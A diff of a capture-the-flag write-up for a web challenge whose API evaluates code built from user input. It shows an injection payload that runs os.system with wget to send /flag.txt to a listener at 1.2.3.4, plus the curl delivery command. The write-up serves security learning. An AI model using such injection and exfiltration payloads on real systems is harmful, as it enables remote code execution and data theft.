@@ -1,6 +1,6 @@
 # [Web] Evaluation deck
 
-This challenge presents a web application that presents an API to perform an operation. It takes 2 numbers and 1 operator, and evaluates the corresponding code
+This challenge is about a web application that presents an API to perform an operation. It takes 2 numbers and 1 operator, and evaluates the corresponding code
 
 ```python
 @api.route('/get_health', methods=['POST'])
@@ -26,7 +26,7 @@ def count():
         return response('Something Went Wrong!'), 500
 ```
 
-We can use the following payload, replacing the operator by a system call
+We can take the following payload, replacing the operator by a system call
 
 ```json
 {"current_health":"0", "attack_power":"0", "operator": ";__import__('os').system('wget 1.2.3.4:4444?aaa=`cat /flag.txt`');"}
@@ -38,7 +38,7 @@ And use it
 curl -d @payload.txt  http://157.245.42.104:32089/api/get_health
 ```
 
-Using a python listener, the flag is received
+Running a python listener, the flag is received
 
 ```bash
 python -m http.server 4444
